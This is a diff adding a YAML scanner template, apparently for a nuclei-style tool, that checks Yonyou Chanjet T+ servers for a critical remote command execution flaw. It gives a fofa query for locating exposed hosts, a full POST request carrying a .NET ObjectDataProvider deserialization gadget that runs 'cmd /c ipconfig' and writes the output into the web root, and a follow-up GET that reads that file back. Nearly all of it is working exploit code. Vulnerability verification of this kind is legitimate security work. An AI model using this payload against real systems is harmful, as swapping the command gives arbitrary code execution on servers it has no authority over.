@@ -1,0 +1,39 @@
+id: 用友 畅捷通T+ GetStoreWarehouseByStore 远程命令执行漏洞
+info:
+  name: 用友 畅捷通T+ GetStoreWarehouseByStore 远程命令执行漏洞
+  severity: critical
+  type: 远程命令执行漏洞
+  search-engine:
+    - fofa: app="畅捷通-TPlus"
+  link:
+    - https://peiqi.wgpsec.org/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT+%20GetStoreWarehouseByStore%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+http:
+  logic: and
+  Packets:
+    - method: POST
+      path: /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore
+      head:
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
+        Connection: close
+        Content-Length: 668
+        X-Ajaxpro-Method: GetStoreWarehouseByStore
+        Accept-Encoding: gzip
+      body: "{\"storeID\":{\"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\"MethodName\":\"Start\",\"ObjectInstance\":{\"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\"StartInfo\":{\"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\"FileName\":\"cmd\",\"Arguments\":\"/c ipconfig > C:/Progra~2/Chanjet/TPlusStd/WebSite/2RUsL6jgx9sGX4GItQBcVfxarM.txt\"}}}}"
+      matchers:
+        regex-logic: and
+        regex:
+          - "actorId"
+          - "archivesId"
+    - method: GET
+      path: /tplus/2RUsL6jgx9sGX4GItQBcVfxarM.txt
+      head:
+        Accept-Encoding: gzip, deflate
+        Accept: "*/*"
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
+      body: ""
+      matchers:
+        regex-logic: and
+        regex:
+          - "Windows"
+          - "DNS"
+          - "IPv4"
